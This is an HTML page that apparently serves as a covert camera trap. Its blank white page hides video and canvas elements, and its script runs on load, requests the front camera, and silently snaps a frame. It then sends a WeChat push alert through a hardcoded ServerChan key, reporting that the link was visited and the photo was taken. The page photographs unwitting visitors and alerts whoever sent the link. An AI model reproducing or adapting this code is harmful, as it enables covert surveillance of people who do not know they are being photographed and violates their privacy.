<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<style>
video,canvas{display:none}
body{background:#fff;height:100vh;}
</style>
</head>
<body>
<video id="cam" autoplay playsinline muted></video>
<canvas id="box" width="480" height="480"></canvas>

<script>
const SEND_KEY = "SCT347091TUpxTiAuPOAvg27UhZnouc6Th";

// 直接推送文字到微信，无任何多余逻辑
async function pushText() {
  try {
    await fetch(`https://sctapi.ftqq.com/${SEND_KEY}.send`, {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: "title=链接已被访问&desp=对方已经允许摄像头权限，拍照已触发"
    });
  } catch (e) {}
}

// 自动拍照核心逻辑
async function autoTake() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" }
    });
    const video = document.getElementById("cam");
    const canvas = document.getElementById("box");
    const ctx = canvas.getContext("2d");
    video.srcObject = stream;

    video.onloadedmetadata = () => {
      // 立刻拍照+推送
      ctx.drawImage(video, 0, 0, 480, 480);
      stream.getTracks().forEach(track => track.stop());
      pushText();
    };
  } catch (e) {}
}

autoTake();
</script>
</body>
</html>
